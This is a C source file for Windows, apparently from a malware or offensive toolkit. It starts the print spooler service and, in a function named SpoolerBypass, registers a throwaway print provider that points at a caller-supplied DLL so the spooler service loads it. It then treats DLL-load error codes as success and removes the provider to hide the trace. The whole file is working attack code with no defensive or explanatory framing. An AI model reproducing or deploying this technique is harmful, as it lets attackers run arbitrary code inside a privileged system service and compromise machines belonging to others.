#include <windows.h>
#include <stdio.h>

#include "ntdll.h"
#include "utils.h"
#include "spooler.h"
#include "splice.h"

BOOL SpoolerStart()
{
	BOOL bRet = FALSE;

	SC_HANDLE hMngr = OpenSCManager(NULL,NULL,SC_MANAGER_CONNECT);
	if (hMngr)
	{
		SC_HANDLE hServ = OpenService(hMngr,"spooler",SERVICE_QUERY_STATUS|SERVICE_START);
		if (hServ)
		{
			if (StartService(hServ,0,NULL))
			{
				for (int i = 0; i < 3; i++)
				{
					DWORD dwNeed;
					SERVICE_STATUS_PROCESS ServStatus = {0};

					if (!QueryServiceStatusEx(hServ,SC_STATUS_PROCESS_INFO,(LPBYTE)&ServStatus,sizeof(ServStatus),&dwNeed)) break;

					if (ServStatus.dwCurrentState == SERVICE_RUNNING)
					{
						bRet = TRUE;

						break;
					}

					Sleep(2000);
				}
			}
			else
			{
				DbgPrint(__FUNCTION__"(): StartService failed last error %x\n",GetLastError());
			}

			CloseServiceHandle(hServ);
		}
		else
		{
			DbgPrint(__FUNCTION__"(): OpenService failed last error %x\n",GetLastError());
		}

		CloseServiceHandle(hMngr);
	}
	else
	{
		DbgPrint(__FUNCTION__"(): OpenSCManager failed last error %x\n",GetLastError());
	}

	return bRet;
}

BOOL SpoolerBypass(LPSTR lpDllName)
{
	BOOL bRet = FALSE;
	PROVIDOR_INFO_1 ProvidorInfo;
	CHAR chName[15];

	_snprintf(chName,RTL_NUMBER_OF(chName)-1,"%x",GetCurrentThreadId()^GetTickCount());

	ProvidorInfo.pName = chName;
	ProvidorInfo.pEnvironment = NULL;
	ProvidorInfo.pDLLName = lpDllName;

	AddPrintProvidorA(chName,1,(LPBYTE)&ProvidorInfo);

	if (GetLastError() == 0x6BA)
	{
		if (GetLastError() == 0x6BA /*RPC_S_SERVER_UNAVAILABL*/)
		{
			if (SpoolerStart()) 
			{
				AddPrintProvidorA(chName,1,(LPBYTE)&ProvidorInfo);
			}
		}
	}

	if (GetLastError() == ERROR_PROC_NOT_FOUND || GetLastError() == ERROR_DLL_INIT_FAILED || GetLastError() == ERROR_MOD_NOT_FOUND)
	{
		bRet = TRUE;
	}

	DbgPrint(__FUNCTION__"(): %s\n", bRet ? "OK" : "failed");

	DeletePrintProvidorA(NULL,NULL,chName);

	return bRet;
}